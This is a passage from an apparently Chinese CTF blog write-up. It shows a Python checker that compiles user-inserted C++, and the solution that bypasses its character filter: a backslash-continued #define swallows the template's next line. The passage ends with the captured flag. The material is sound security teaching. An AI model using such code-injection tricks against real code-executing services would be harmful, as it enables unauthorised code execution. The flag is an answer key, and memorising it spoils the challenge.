CODE HERE */&quot;</span>, content)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./temp.cpp&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f: f.write(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> (os.path.exists(<span class="string">&quot;./temp&quot;</span>)): subprocess.run([<span class="string">&quot;rm&quot;</span>, <span class="string">&quot;./temp&quot;</span>], timeout=<span class="number">2</span>)</span><br><span class="line">    res = subprocess.run([<span class="string">&quot;g++&quot;</span>, <span class="string">&quot;./temp.cpp&quot;</span>, <span class="string">&quot;-o&quot;</span>, <span class="string">&quot;./temp&quot;</span>, <span class="string">&quot;-std=c++11&quot;</span>], timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> res.returncode != <span class="number">0</span>:</span><br><span class="line">        exit(<span class="string">&quot;Compilation failed!&quot;</span>)</span><br><span class="line">    result = subprocess.run([<span class="string">&quot;./temp&quot;</span>], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>, timeout=<span class="number">2</span>)</span><br><span class="line">    output = result.stdout</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Program output:\n&quot;</span> + output)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;NewStar!!!&quot;</span> <span class="keyword">in</span> output: f = <span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;r&quot;</span>); <span class="built_in">print</span>(f.read())</span><br><span class="line"><span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Execution timed out!&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//template_cpp.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* YOUR CODE HERE */</span></span><br><span class="line">    std::string s = <span class="string">&quot;NoWay&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; s;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是先进行一段操作（由我们输入），然后s被赋值为”NoWay”，但需要输出的s是”NewStar!!!”才能得到flag，输入的代码中不能包含<code>()[]&#123;&#125;&lt;&gt;</code>。<br>可以考虑把<code>std::string s = &quot;NoWay&quot;;</code>一句类似于注释掉，C++中可以用\来连接下一行（大部分语言好像都可以）。<br>于是填入</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::string s = <span class="string">&quot;NewStar!!!&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> x \</span></span><br></pre></td></tr></table></figure><p>相当于<code>#define x std::string s = &quot;NoWay&quot;;</code><br>x被宏定义为这一段，对s的赋值就不起作用了。<br>flag{d61bf1f5-3767-4872-a991-a31f49b71f36}</p>]]></content>
      
      
